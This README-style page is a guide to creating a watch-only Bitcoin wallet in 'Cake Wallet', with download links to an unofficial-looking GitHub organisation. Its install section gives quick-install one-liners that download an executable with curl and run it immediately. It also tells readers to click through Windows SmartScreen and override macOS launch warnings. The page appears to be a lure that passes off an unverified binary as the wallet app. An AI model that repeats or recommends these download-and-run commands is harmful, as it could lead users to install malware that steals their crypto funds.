![Cake Wallet watch only guide](assets/cake-wallet-watch-only-article-banner.png)

# Add a Watch-Only Wallet in Cake Wallet

Balances without spending keys, and the limits that come with it.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

Restore with a Bitcoin xpub or zpub to create a watch-only wallet. It can receive and show balances, and it cannot spend, because the private keys are not on the device. Use it to monitor cold storage; keep a signed wallet somewhere else for spending.

<!-- ARTICLE-BODY-BEGIN -->

## What watch-only means
A watch-only wallet holds public keys. It derives addresses, scans the chain and reports balances, so you can see what a cold wallet holds without bringing its keys online.

The trade-off is one-directional: everything works except the final step. Any attempt to send fails, not because the app is broken but because there is nothing to sign with.

## Creating one
Choose restore, then the watch-only or xpub option, and paste the extended public key. Give it the same label as the wallet it watches, so a later restore is not confusing.

An xpub from a different account or a different derivation path produces different addresses and shows a zero balance. Check the first receiving address against the cold wallet before trusting the view.

## Receiving and monitoring
Receiving works normally: the watch-only wallet derives an address the cold wallet also controls, and the balance appears after it confirms. That makes it a good way to check that a hardware device is still doing its job.

Spending does not. To move funds you connect the signing device or restore a wallet that has the keys, which is exactly the separation you wanted.

## Paper backups as xpub
Some paper backups carry an xpub rather than words, which is the safest kind of paper to hold: it cannot spend. The downside is that it also cannot recover the funds if the signing side is lost.

<a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-paper-wallet.md">Restore a paper wallet in Cake Wallet</a> covers the cases where the paper holds keys or words instead, which behave quite differently.

## Moving to a signing device
Watch-only plus a hardware device is the standard cold-storage pair: the device signs, the wallet watches. Nothing about the watch-only wallet changes when the device is connected; the device simply provides the missing half.

<a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-hardware-wallet.md">Hardware wallet support in Cake Wallet</a> covers the vendors and the per-platform limits, including the Linux build, which supports no device at all.

## Current build
Watch-only support depends on the build and on the coin, and Bitcoin is the evidenced case. Install the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">latest Cake Wallet release</a> and use the restore flow rather than looking for a separate menu.

If the option is not offered, the build or the coin is the reason. <a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-restore-wallet.md">Restore your Cake Wallet wallet</a> covers the other restore routes so you can match the backup you actually hold.

## FAQ
### How do I add a watch-only Bitcoin wallet?
Use restore with an xpub or zpub, then verify the first address matches the wallet it watches.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[restore your Cake Wallet wallet](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-restore-wallet.md) · [restore a paper wallet in Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-paper-wallet.md) · [hardware wallet support in Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-hardware-wallet.md) · [latest Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
